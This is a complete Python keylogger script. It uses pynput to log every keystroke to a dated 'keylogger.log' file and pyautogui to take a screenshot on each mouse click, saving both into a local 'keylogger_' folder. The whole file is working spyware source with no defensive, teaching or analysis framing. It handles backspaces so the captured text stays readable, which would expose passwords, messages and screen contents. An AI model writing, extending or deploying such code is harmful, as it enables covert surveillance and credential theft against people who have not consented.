from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
from datetime import datetime
import re, os, pyautogui as py

dateTime = datetime.now()
date = dateTime.strftime("%d-%m")
dirRaiz = "../screen/keylogger_" + date + "/"
fileLog = dirRaiz + "keylogger.log"

try:
    os.mkdir(dirRaiz)
except:
    pass

def on_press(key):
    key = str(key)
    key = re.sub(r'\'', '', key)
    key = re.sub(r'Key.space', ' ', key)
    key = re.sub(r'Key.enter', '\n', key)
    key = re.sub(r'Key.tab', '\t', key)
    key = re.sub(r'Key.backspace', 'apagar', key)
    key = re.sub(r'Key.*', '', key)
    with open(fileLog, 'a') as log:
        if str(key) == str("apagar"):
            if os.stat(fileLog).st_size != 0:
                key = re.sub(r'Key.backspace', '', key)
                log.seek(0,2)
                caractere = log.tell()
                log.truncate(caractere - 1)
        else:
            log.write(key)

def on_click(x, y, buttom, pressed):
    if pressed:
        safePrint = py.screenshot()
        hour = datetime.now()
        timePrint = hour.strftime("%H:%M:%S")
        safePrint.save(os.path.join(dirRaiz, "printKeylogger_" + timePrint + ".jpg"))

keyboardListener = KeyboardListener(on_press=on_press)
mouseListener = MouseListener(on_click=on_click)

keyboardListener.start()
mouseListener.start()
keyboardListener.join()
mouseListener.join()